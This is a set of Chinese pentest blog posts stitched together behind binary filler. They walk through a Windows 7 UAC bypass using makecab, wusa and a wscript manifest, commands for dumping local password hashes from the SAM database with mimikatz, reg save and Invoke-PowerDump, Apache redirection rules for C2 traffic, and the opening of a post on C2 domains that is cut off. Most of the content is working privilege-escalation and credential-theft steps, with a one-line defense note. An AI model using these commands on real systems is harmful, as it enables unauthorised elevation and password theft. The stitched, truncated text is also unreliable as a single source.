                                                                                                                                          @                                              @                                                @                                                @                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                   E   %                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       DSDB                             `                                                     @                                                @                                                @                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                              <article class="post">
  <h1>Empire中的Invoke-WScriptBypassUAC利用分析</h1>

  <div class="entry">
    <h2 id="0x00-前言">0x00 前言</h2>
<hr>

<p>知名的后渗透测试框架Empire是一个很好的学习模板，其中包含的后渗透技巧很值得深入研究。</p>

<p>本文将要挑选Empire中一个经典的UAC绕过方法Invoke-WScriptBypassUAC进行分析，介绍绕过原理以及在渗透测试中的更多利用技巧。知道如何利用，才能知道如何防御。</p>

<p>Invoke-WScriptBypassUAC地址：</p>

<p>https://github.com/EmpireProject/Empire/blob/master/data/module_source/privesc/Invoke-WScriptBypassUAC.ps1</p>

<h2 id="0x01-简介">0x01 简介</h2>
<hr>

<p>本文将要介绍如下内容：</p>

<ul>
  <li>Invoke-WScriptBypassUAC绕过原理</li>
  <li>利用扩展</li>
  <li>防御检测</li>
</ul>

<h2 id="0x02-invoke-wscriptbypassuac绕过原理">0x02 Invoke-WScriptBypassUAC绕过原理</h2>
<hr>

<p>Invoke-WScriptBypassUAC通过powershell实现，思路上借鉴了Vozzie分享的github，地址如下：</p>

<p>https://github.com/Vozzie/uacscript</p>

<p>Vozzie提到ZDI和微软选择忽略该UAC绕过“漏洞”，ZDI认为这不是一个远程漏洞，微软认为UAC绕过不属于漏洞范畴</p>

<p>Invoke-WScriptBypassUAC在实现上使用了一些实用的小技巧，所以本文主要对Invoke-WScriptBypassUAC的绕过方法进行分析</p>

<p>该方法只适用于Win7，而Win8、Win10不适用（原因在后面介绍）</p>

<p>测试系统： Win7 x86</p>

<p>由于powershell格式的源代码公开，所以直接介绍该脚本关键的操作流程：</p>

<ol>
  <li>判断操作系统是否为Win7，是否为普通权限</li>
  <li>Temp目录释放文件wscript.exe.manifest</li>
  <li>使用makecab.exe对wscript.exe.manifest和wscript.exe进行压缩</li>
  <li>使用wusa将压缩包解压缩，将wscript.exe.manifest和wscript.exe释放至c:\Windows目录</li>
  <li>payload保存在Appdata文件夹的ADS中</li>
  <li>使用c:\Windows\wscript.exe执行payload，实现管理员权限执行payload，绕过UAC</li>
</ol>

<h2 id="0x03-利用扩展">0x03 利用扩展</h2>
<hr>

<p>掌握操作流程后，我们完全可以手动进行拆分测试，在这个过程中能发现更多利用思路</p>

<h3 id="1保存wscriptexemanifest文件">1、保存wscript.exe.manifest文件</h3>

<p>代码如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;?xml version="1.0" encoding="UTF-8" standalone="yes"?&gt;
&lt;assembly xmlns="urn:schemas-microsoft-com:asm.v1"
          xmlns:asmv3="urn:schemas-microsoft-com:asm.v3"
          manifestVersion="1.0"&gt;
  &lt;asmv3:trustInfo&gt;
    &lt;security&gt;
      &lt;requestedPrivileges&gt;
        &lt;requestedExecutionLevel level="RequireAdministrator" uiAccess="false"/&gt;
      &lt;/requestedPrivileges&gt;
    &lt;/security&gt;
  &lt;/asmv3:trustInfo&gt;
  &lt;asmv3:application&gt;
    &lt;asmv3:windowsSettings xmlns="http://schemas.microsoft.com/SMI/2005/WindowsSettings"&gt;
      &lt;autoElevate&gt;true&lt;/autoElevate&gt;
      &lt;dpiAware&gt;true&lt;/dpiAware&gt;
    &lt;/asmv3:windowsSettings&gt;
  &lt;/asmv3:application&gt;
&lt;/assembly&gt;
</code></pre></div></div>

<h3 id="2使用makecab制作cab文件">2、使用makecab制作cab文件</h3>

<p>cmd:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>makecab c:\windows\system32\wscript.exe %TMP%\1.tmp
makecab wscript.exe.manifest %TMP%\2.tmp
</code></pre></div></div>

<h3 id="3使用wusa解压缩cab文件并释放至cwindows">3、使用wusa解压缩cab文件并释放至c:\windows</h3>

<p>cmd:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>wusa %TMP%\1.tmp /extract:"c:\windows" /quiet
wusa %TMP%\2.tmp /extract:"c:\windows" /quiet
</code></pre></div></div>

<p><strong>注：</strong></p>

<p>该方法成功的关键在于使用wusa能够将cab文件解压缩至c:\windows，通常情况下，向c:\windows目录释放文件需要管理员权限，而借助wusa，普通用户权限即可，当然其他管理员权限的目录也可以，例如： <code class="language-plaintext highlighter-rouge">C:\Windows\addins</code></p>

<h3 id="4使用该wscriptexe执行vbs或者js脚本">4、使用该wscript.exe执行vbs或者js脚本</h3>

<p>cmd：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>c:\windows\wscript.exe c:\test\1.vbs
c:\windows\wscript.exe c:\test\1.js
</code></pre></div></div>

<p><strong>注：</strong></p>

<p>此处js和vbs脚本需要绝对路径，虽然是普通用户权限的cmd，但因为wscript.exe同级目录下的wscript.exe.manifest指定以管理员权限启动，所以执行的vbs或者js脚本是管理员权限，这就实现了UAC绕过</p>

<p>执行cmd命令对应的vbs脚本如下:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Dim objShell
Dim oFso
Set oFso = CreateObject("Scripting.FileSystemObject")
Set objShell = WScript.CreateObject("WScript.Shell")
command = "cmd /c calc.exe"
objShell.Run command, 0
Set objShell = Nothing
</code></pre></div></div>

<p>对应的js脚本如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>new ActiveXObject("WScript.Shell").Run("cmd /c calc.exe",0,true);
</code></pre></div></div>

<h3 id="5绕过后清除缓存文件">5、绕过后清除缓存文件</h3>

<p>删除c:\windows\下的wscript.exe和wscript.exe.manifest</p>

<p>对应vbs脚本如下:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Dim objShell
Dim oFso
Set oFso = CreateObject("Scripting.FileSystemObject")
Set objShell = WScript.CreateObject("WScript.Shell")
command = "cmd /c del c:\windows\wscript.exe &amp;&amp; del c:\windows\wscript.exe.manifest"
objShell.Run command, 0
Set objShell = Nothing
</code></pre></div></div>

<p>对应js脚本如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>new ActiveXObject("WScript.Shell").Run("cmd /c del c:\\windows\\wscript.exe &amp;&amp; del c:\\windows\\wscript.exe.manifest",0,true);
</code></pre></div></div>

<p><strong>注：</strong></p>

<p>删除c:\windows\下的wscript.exe和wscript.exe.manifest需要管理员权限</p>

<p>删除缓存文件：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>del %TMP%\1.tmp
del %TMP%\2.tmp
</code></pre></div></div>

<h3 id="6补充">6、补充</h3>

<p>(1)可供利用的路径有很多，查看文件夹属性可使用如下powershell命令：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Get-Acl -Path c:\windows|select Owner
</code></pre></div></div>

<p>(2)保存vbs或者js脚本的路径有很多，例如特殊ads：</p>

<ul>
  <li>…文件</li>
  <li>特殊COM文件</li>
  <li>磁盘根目录</li>
</ul>

<p>更多细节可参考文章<a href="https://3gstudent.github.io/3gstudent.github.io/Hidden-Alternative-Data-Streams%E7%9A%84%E8%BF%9B%E9%98%B6%E5%88%A9%E7%94%A8%E6%8A%80%E5%B7%A7/">《Hidden Alternative Data Streams的进阶利用技巧》</a></p>

<p>当然，Invoke-WScriptBypassUAC使用的ADS位置也很隐蔽</p>

<p><code class="language-plaintext highlighter-rouge">$env:USERPROFILE\AppData</code>默认为系统隐藏文件</p>

<p>所以使用<code class="language-plaintext highlighter-rouge">dir /r</code>看不到文件夹<code class="language-plaintext highlighter-rouge">$env:USERPROFILE\AppData</code>，当然也无法看到添加的ads</p>

<p>需要使用<code class="language-plaintext highlighter-rouge">dir /a:h /r</code> （/a:h指定查看系统隐藏文件）才能看到，或者查看所有文件：<code class="language-plaintext highlighter-rouge">dir /a /r</code></p>

<p>(3)Win8失败的原因</p>

<p>使用makecab和wusa能够将cab文件解压缩至高权限目录，如c:\windows</p>

<p>但利用wscript.exe和wscript.exe.manifest实现高权限执行的方法失效，Win8使用了内嵌manifest</p>

<p>(4)Win10失败的原因</p>

<p>Win10系统无法使用makecab和wusa能够将cab文件解压缩至高权限目录，如c:\windows</p>

<p>当然，也使用了内嵌manifest</p>

<h2 id="0x04-wusa特性的进一步利用">0x04 wusa特性的进一步利用</h2>
<hr>

<p><strong>wusa特性：</strong></p>

<p>在普通用户的权限下，能够将文件释放至管理员权限的文件夹</p>

<p>适用Win7、Win8</p>

<h3 id="利用一文件名劫持">利用一：文件名劫持</h3>

<p>1、将calc.exe重命名为regedit.com</p>

<p>2、在c:\windows释放文件regedit.com</p>

<p>cmd：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>makecab c:\test\regedit.com %TMP%\1.tmp
wusa %TMP%\1.tmp /extract:"c:\windows" /quiet
</code></pre></div></div>

<p>3、劫持</p>

<p>cmd输入regedit，会执行regedit.com，而不是regedit.exe</p>

<p>关于该利用方法的详情可参考文章：《A dirty way of tricking users to bypass UAC》</p>

<h3 id="其他利用方法暂略">其他利用方法(暂略)</h3>

<h2 id="0x05-防御">0x05 防御</h2>
<hr>

<p>该UAC绕过方法只适用于Win7，尚未见到对应补丁，杀毒软件能对此脚本进行拦截，但也存在绕过方法</p>

<p>站在防御者的角度，建议监控wusa.exe的调用</p>

<h2 id="0x06-小结">0x06 小结</h2>
<hr>

<p>本文对Invoke-WScriptBypassUAC进行了分析，虽然微软不认可该漏洞，但在后渗透阶段，不论是渗透测试人员，还是防御方，对此都应该注意。</p>

<hr>

<p><a href="https://github.com/3gstudent/feedback/issues/new">LEAVE A REPLY</a></p>


  </div>

  <div class="date">
    Written on September 12, 2017
  </div>

  
</article><article class="post">
  <h1>渗透技巧——通过SAM数据库获得本地用户hash</h1>

  <div class="entry">
    <h2 id="0x00-前言">0x00 前言</h2>
<hr>

<p>在渗透测试中，获得了Windows系统的访问权限后，通常会使用mimikatz的<code class="language-plaintext highlighter-rouge">sekurlsa::logonpasswords</code>命令尝试读取进程lsass的信息来获取当前登录用户的密码信息，但想要全面获取系统中的密码信息，还要对SAM数据库中保存的信息进行提取，导出当前系统中所有本地用户的hash。</p>

<h2 id="0x01-简介">0x01 简介</h2>
<hr>

<p>本文将要介绍以下内容：</p>

<ul>
  <li>通过SAM数据库获得用户hash的多种方法</li>
  <li>原理分析</li>
</ul>

<h2 id="0x02-通过sam数据库获得用户hash的方法">0x02 通过SAM数据库获得用户hash的方法</h2>
<hr>

<h3 id="1在线读取sam数据库">1、在线读取SAM数据库</h3>

<p>读取当前系统的SAM数据库文件，获得系统所有本地用户的hash</p>

<h4 id="1-mimikatz">(1) mimikatz</h4>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>privilege::debug
token::elevate
lsadump::sam
</code></pre></div></div>

<p>测试如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-2-8/2-1.png" alt="Alt text"></p>

<h4 id="2-pwdump7">(2) pwdump7</h4>

<p>下载地址：</p>

<p>http://passwords.openwall.net/b/pwdump/pwdump7.zip</p>

<p>管理员权限执行，如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-2-8/2-2.png" alt="Alt text"></p>

<h4 id="3-powershell">(3) powershell</h4>

<p>下载地址：</p>

<p>https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-PowerDump.ps1</p>

<p>管理员权限执行，测试如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-2-8/2-3.png" alt="Alt text"></p>

<h3 id="2离线读取sam数据库">2、离线读取SAM数据库</h3>

<p>获取当前系统的SAM数据库文件，在另一系统下进行读取</p>

<p>导出SAM数据库文件有以下两种实现方法：</p>

<h4 id="1-保存注册表">(1) 保存注册表</h4>

<p>管理员权限</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>reg save HKLM\SYSTEM SystemBkup.hiv
reg save HKLM\SAM SamBkup.hiv
</code></pre></div></div>

<h4 id="2-复制文件">(2) 复制文件</h4>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>C:\Windows\System32\config\SYSTEM
C:\Windows\System32\config\SAM
</code></pre></div></div>

<p>默认无法被复制，如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-2-8/2-4.png" alt="Alt text"></p>

<p>需要借助NinjaCopy，作者Joe Bialek，参考下载地址：</p>

<p>https://github.com/3gstudent/NinjaCopy</p>

<p>导出SAM数据库文件后，在另一系统，可通过以下方式导出用户hash：</p>

<h4 id="1-mimikatz-1">(1) mimikatz</h4>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>lsadump::sam /sam:SamBkup.hiv /system:SystemBkup.hiv
</code></pre></div></div>

<p>如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-2-8/3-1.png" alt="Alt text"></p>

<p><strong>注：</strong></p>

<p>mimikatz的官方说明有问题，地址如下：</p>

<p>https://github.com/gentilkiwi/mimikatz/wiki/module-~-lsadump</p>

<p>导出命令：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>lsadump::sam SystemBkup.hiv SamBkup.hiv
</code></pre></div></div>

<p>会报错，如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-2-8/3-2.png" alt="Alt text"></p>

<p>可用的命令由@我爱这个世界提供</p>

<h3 id="补充">补充：</h3>

<p>以下工具在读取Win7系统的SAM数据库文件会报错</p>

<h4 id="1-pwdump7">(1) Pwdump7</h4>

<p>如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-2-8/3-3.png" alt="Alt text"></p>

<h4 id="2-pwdump5">(2) Pwdump5</h4>

<p>下载地址：</p>

<p>http://passwords.openwall.net/b/pwdump/pwdump5.zip</p>

<p>读取结果不正确，如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-2-8/3-4.png" alt="Alt text"></p>

<h4 id="3-cain">(3) cain</h4>

<p>测试如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-2-8/3-5.png" alt="Alt text"></p>

<h2 id="0x03-原理分析">0x03 原理分析</h2>
<hr>

<h3 id="1读取hklmsystem获得syskey">1、读取HKLM\SYSTEM，获得syskey</h3>

<p>读取注册表项<code class="language-plaintext highlighter-rouge">HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa</code>下的键值<code class="language-plaintext highlighter-rouge">JD</code>、<code class="language-plaintext highlighter-rouge">Skew1</code>、<code class="language-plaintext highlighter-rouge">GBG</code>和<code class="language-plaintext highlighter-rouge">Data</code>中的内容，拼接成syskey</p>

<p>代码可参考：</p>

<p>https://github.com/johannwmeyer/quarkspwdump/blob/a68aa6330f37eb8d00055c73e6a4e3cb52bcdd6d/src/crypt.cpp#L222</p>

<p>https://github.com/gentilkiwi/mimikatz/blob/master/mimikatz/modules/kuhl_m_lsadump.c#L219</p>

<p>完整计算代码可参考：</p>

<p>https://raw.githubusercontent.com/3gstudent/Writeup/master/getsyskey.cpp</p>

<p>(Steal from http://www.zcgonvh.com/post/ntds_dit_pwd_dumper.html)</p>

<h3 id="2使用syskey解密hklmsam">2、使用syskey解密HKLM\SAM</h3>

<p>读取注册表项<code class="language-plaintext highlighter-rouge">HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users</code>下每个用户中F项和V项的内容，使用syskey进行一系列的解密</p>

<p>详细解密过程可参考如下链接：</p>

<p>http://www.xfocus.net/articles/200306/550.html</p>

<p>综上，想要通过SAM数据库获得用户hash，需要获得两个文件：HKLM\SYSTEM和HKLM\SAM</p>

<p>最直接的导出方式是读取当前系统下的注册表HKLM\SYSTEM和HKLM\SAM，但需要获得system权限</p>

<p>从admin切换到system权限的方法可参考之前的文章：<a href="https://3gstudent.github.io/3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-%E4%BB%8EAdmin%E6%9D%83%E9%99%90%E5%88%87%E6%8D%A2%E5%88%B0System%E6%9D%83%E9%99%90/">《渗透技巧——从Admin权限切换到System权限》</a></p>

<h2 id="0x04-小节">0x04 小节</h2>
<hr>

<p>本文介绍了通过SAM数据库获得所有用户hash的多种方法，关键在于读取HKLM\SYSTEM和HKLM\SAM</p>

<hr>

<p><a href="https://github.com/3gstudent/feedback/issues/new">LEAVE A REPLY</a></p>


  </div>

  <div class="date">
    Written on February  8, 2018
  </div>

  
</article><article class="post">
  <h1>CIA Hive Beacon Infrastructure复现1——使用Apache mod_rewrite实现http流量分发</h1>

  <div class="entry">
    <h2 id="0x00-前言">0x00 前言</h2>
<hr>

<p>2017年11月9日维基解密公布一个代号为Vault8的文档，包含服务器远程控制工具Hive的源代码和开发文档。开发文档中的框架图显示Hive支持流量分发功能，若流量有效，转发至Honeycomb服务器，若流量存在问题，转发至Cover Server。
本文仅站在技术研究的角度，尝试使用Apache的mod_rewrite模块实现http流量分发，完成相同的目标。</p>

<p>标记后的框架图如下：</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-4-16/0.png" alt="Alt text"></p>

<p>之前的分析文章：</p>

<p><a href="https://3gstudent.github.io/3gstudent.github.io/CIA-Hive%E6%B5%8B%E8%AF%95%E6%8C%87%E5%8D%97-%E6%BA%90%E4%BB%A3%E7%A0%81%E8%8E%B7%E5%8F%96%E4%B8%8E%E7%AE%80%E8%A6%81%E5%88%86%E6%9E%90/">《CIA Hive测试指南——源代码获取与简要分析》</a></p>

<h2 id="0x01-简介">0x01 简介</h2>
<hr>

<p>本文将要介绍以下内容：</p>

<ul>
  <li>Windows系统下安装配置Apache mod_rewrite</li>
  <li>Ubuntu系统下安装配置Apache mod_rewrite</li>
  <li>规则配置技巧与实例</li>
  <li>根据判定条件实现http流量分发</li>
</ul>

<h2 id="0x02-windows系统下安装配置apache-mod_rewrite">0x02 Windows系统下安装配置Apache mod_rewrite</h2>
<hr>

<h3 id="1下载apache">1、下载Apache</h3>

<p>地址：</p>

<p>http://httpd.apache.org/download.cgi</p>

<p>选择需要的版本，测试版本Apache 2.4.33，下载地址：</p>

<p>https://www.apachehaus.com/cgi-bin/download.plx?dli=wUWZ1allWW00kej9iUG5UeJVlUGRVYRdnWzQmW</p>

<h3 id="2安装">2、安装</h3>

<p>解压后通过命令行安装：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>cd \Apace24\bin
httpd -k install
</code></pre></div></div>

<h3 id="3开启mod_rewrite模块">3、开启mod_rewrite模块</h3>

<p>编辑文件： <code class="language-plaintext highlighter-rouge">\Apace24\conf\httpd.conf</code></p>

<p>找到<code class="language-plaintext highlighter-rouge">#LoadModule rewrite_module modules/mod_rewrite.so</code>，去掉<code class="language-plaintext highlighter-rouge">#</code></p>

<h3 id="4开启支持htaccess文件">4、开启支持.htaccess文件</h3>

<p>编辑文件： <code class="language-plaintext highlighter-rouge">\Apace24\conf\httpd.conf</code></p>

<p>定位如下位置：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>DocumentRoot "${SRVROOT}/htdocs"
&lt;Directory "${SRVROOT}/htdocs"&gt;
    #
    # Possible values for the Options directive are "None", "All",
    # or any combination of:
    #   Indexes Includes FollowSymLinks SymLinksifOwnerMatch ExecCGI MultiViews
    #
    # Note that "MultiViews" must be named *explicitly* --- "Options All"
    # doesn't give it to you.
    #
    # The Options directive is both complicated and important.  Please see
    # http://httpd.apache.org/docs/2.4/mod/core.html#options
    # for more information.
    #
    Options Indexes FollowSymLinks

    #
    # AllowOverride controls what directives may be placed in .htaccess files.
    # It can be "All", "None", or any combination of the keywords:
    #   Options FileInfo AuthConfig Limit
    #
    AllowOverride All

    #
    # Controls who can get stuff from this server.
    #
    Require all granted
&lt;/Directory&gt;
</code></pre></div></div>

<p><code class="language-plaintext highlighter-rouge">AllowOverride None</code>改为<code class="language-plaintext highlighter-rouge">AllowOverride All</code></p>

<h3 id="5编写htaccess文件配置规则">5、编写.htaccess文件，配置规则</h3>

<p>保存路径为<code class="language-plaintext highlighter-rouge">\Apace24\htdocs\</code></p>

<p>测试规则为将1.html重定向到2.html，具体内容如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;IfModule mod_rewrite.c&gt;
RewriteEngine on
RewriteRule 1.html 2.html
&lt;/IfModule&gt;
</code></pre></div></div>

<p>使用记事本打开，另存为文件，文件名为<code class="language-plaintext highlighter-rouge">".htaccess"</code></p>

<p><strong>注：</strong></p>

<p>文件名包含引号<code class="language-plaintext highlighter-rouge">"</code>，如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-4-16/2-1.png" alt="Alt text"></p>

<p>2.html保存在<code class="language-plaintext highlighter-rouge">\Apace24\htdocs\</code>，内容如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;html&gt;
&lt;body&gt;
True page
&lt;/body&gt;
&lt;/html&gt;
</code></pre></div></div>

<h3 id="6开启apache服务">6、开启apache服务</h3>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>httpd.exe -k start
</code></pre></div></div>

<h3 id="7测试">7、测试</h3>

<p>访问<code class="language-plaintext highlighter-rouge">http://127.0.0.1/1.html</code></p>

<p>返回内容<code class="language-plaintext highlighter-rouge">True page</code>，代表网页被重定向到了2.html</p>

<h3 id="8补充">8、补充</h3>

<p>apache的日志路径为<code class="language-plaintext highlighter-rouge">\Apache24\logs</code></p>

<p>mod_rewrite的日志保存在<code class="language-plaintext highlighter-rouge">error.log</code></p>

<p>文件<code class="language-plaintext highlighter-rouge">\Apace24\conf\httpd.conf</code>可指定日志记录等级</p>

<h2 id="0x03-ubuntu系统下安装配置apache-mod_rewrite">0x03 Ubuntu系统下安装配置Apache mod_rewrite</h2>
<hr>

<h3 id="1下载安装">1、下载安装</h3>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sudo apt-get install apache2
</code></pre></div></div>

<h3 id="2开启mod_rewrite模块">2、开启mod_rewrite模块</h3>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sudo a2enmod rewrite
</code></pre></div></div>

<h3 id="3开启支持htaccess文件">3、开启支持.htaccess文件</h3>

<p>编辑文件： <code class="language-plaintext highlighter-rouge">/etc/apache2/apache2.conf</code></p>

<p>定位如下位置：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;Directory /var/www/&gt;
        Options Indexes FollowSymLinks
        AllowOverride None
        Require all granted
&lt;/Directory&gt;
</code></pre></div></div>

<p><code class="language-plaintext highlighter-rouge">AllowOverride None</code>改为<code class="language-plaintext highlighter-rouge">AllowOverride All</code></p>

<h3 id="4编写htaccess文件配置规则">4、编写.htaccess文件，配置规则</h3>

<p>保存路径为<code class="language-plaintext highlighter-rouge">\var\www\html\</code></p>

<p>测试规则为将1.html重定向到2.html，具体内容如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;IfModule mod_rewrite.c&gt;
RewriteEngine on
RewriteRule 1.html 2.html
&lt;/IfModule&gt;
</code></pre></div></div>

<p>2.html保存在<code class="language-plaintext highlighter-rouge">\var\www\html\</code>，内容如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;html&gt;
&lt;body&gt;
True page
&lt;/body&gt;
&lt;/html&gt;
</code></pre></div></div>

<h3 id="5开启apache服务">5、开启apache服务</h3>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sudo /etc/init.d/apache2 restart
</code></pre></div></div>

<h3 id="6测试">6、测试</h3>

<p>访问<code class="language-plaintext highlighter-rouge">http:/IP/1.html</code></p>

<p>返回内容<code class="language-plaintext highlighter-rouge">True page</code>，代表网页被重定向到了2.html</p>

<h3 id="7补充">7、补充</h3>

<p>apache的日志路径为<code class="language-plaintext highlighter-rouge">/var/log/apache2/</code></p>

<p>mod_rewrite的日志保存在error.log</p>

<p>文件<code class="language-plaintext highlighter-rouge">/etc/apache2/apache2.conf</code>可指定日志记录等级</p>

<h2 id="0x04-规则配置技巧与实例">0x04 规则配置技巧与实例</h2>
<hr>

<h3 id="1将所有网页重定向至-httpswwwbaiducom">1、将所有网页重定向至 <code class="language-plaintext highlighter-rouge">https://www.baidu.com</code></h3>

<p>.htaccess文件内容如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;IfModule mod_rewrite.c&gt;
RewriteEngine on
RewriteRule . https://www.baidu.com
&lt;/IfModule&gt;
</code></pre></div></div>

<h3 id="2过滤request-header">2、过滤Request Header</h3>

<h4 id="1-user-agent">(1) User Agent</h4>

<p>只针对特定User Agent的请求进行重定向</p>

<p><strong>实例：</strong></p>

<p>使用Mac下的Safari浏览器访问1.html，将其重定向到2.html</p>

<p>.htaccess文件内容如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;IfModule mod_rewrite.c&gt;
RewriteEngine on
RewriteCond "%{HTTP_USER_AGENT}" "Macintosh; Intel Mac OS X 10_9_3" [NC]
RewriteRule 1.html 2.html
&lt;/IfModule&gt;
</code></pre></div></div>

<p>参数说明：</p>

<p><code class="language-plaintext highlighter-rouge">RewriteCond "%{HTTP_USER_AGENT}" "Macintosh; Intel Mac OS X 10_9_3" [NC]</code>代表判定条件，判断<code class="language-plaintext highlighter-rouge">HTTP_USER_AGENT</code>是否包含字符串<code class="language-plaintext highlighter-rouge">"Macintosh; Intel Mac OS X 10_9_3"</code>(大小写不敏感)</p>

<p>NC: 字符比较，大小写不敏感</p>

<p>详细参数说明可参考：</p>

<p>https://httpd.apache.org/docs/current/mod/mod_rewrite.html#rewritecond</p>

<p><strong>1.使用curl进行测试</strong></p>

<p>模拟Chrome浏览器：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>curl -A "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" http://192.168.62.137/1.html
</code></pre></div></div>

<p>并没重定向，如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-4-16/3-1.png" alt="Alt text"></p>

<p>模拟Mac Safari浏览器：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>curl -A "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.75.14 (KHTML, like Gecko) Version/7.0.3 Safari/7046A194A" http://192.168.62.137/1.html
</code></pre></div></div>

<p>网页重定向，获得2.html的内容，如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-4-16/3-2.png" alt="Alt text"></p>

<p><strong>2.Chrome浏览器修改User Agent的方法</strong></p>

<p>访问页面，<code class="language-plaintext highlighter-rouge">F12</code> -&gt; <code class="language-plaintext highlighter-rouge">More tools</code> -&gt; <code class="language-plaintext highlighter-rouge">Network conditions</code>，选择User agent 为 <code class="language-plaintext highlighter-rouge">Safari —— Mac</code></p>

<p>如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-4-16/3-3.png" alt="Alt text"></p>

<h4 id="2-peferer">(2) Peferer</h4>

<p>只针对特定来源的请求进行重定向</p>

<p><strong>实例：</strong></p>

<p>如果来源为test.com，访问1.html时将其重定向到2.html</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;IfModule mod_rewrite.c&gt;
RewriteEngine on
RewriteCond "%{HTTP_REFERER}" "test.com" [NC]
RewriteRule 1.html 2.html
&lt;/IfModule&gt;
</code></pre></div></div>

<p>使用curl进行测试：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>curl -e "test.com" http://192.168.62.137/1.html
</code></pre></div></div>

<h4 id="3-其他可供选择的过滤条件">(3) 其他可供选择的过滤条件</h4>

<p>如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-4-16/3-4.png" alt="Alt text"></p>

<p><strong>注：</strong></p>

<p>图片来源于https://httpd.apache.org/docs/current/mod/mod_rewrite.html#rewritecond</p>

<p><strong>补充：</strong></p>

<p>Jeff Dimmock在他的博客分享了使用mod_rewrite配置规则的心得，值得学习，地址如下：</p>

<p>https://bluescreenofjeff.com/tags</p>

<h2 id="0x05-小结">0x05 小结</h2>
<hr>

<p>本文介绍了Windows系统和Ubuntu系统下安装配置Apache mod_rewrite的方法，分享配置技巧与实例，在技术研究的角度实现了根据请求条件进行http流量分发。</p>

<p>下篇文章将要介绍https的流量分发实现。</p>

<hr>

<p><a href="https://github.com/3gstudent/feedback/issues/new">LEAVE A REPLY</a></p>


  </div>

  <div class="date">
    Written on April 16, 2018
  </div>

  
</article><article class="post">
  <h1>渗透基础——选择一个合适的C2域名</h1>

  <div class="entry">
    <h2 id="0x00-前言">0x00 前言</h2>
<hr>

<p>在渗透测试中，常常需要选择一个合适的域名作为c2服务器，那么什么样的域名才能称之为”合适”呢？</p>

<p>expireddomains.net也许能够给你一些思路。</p>

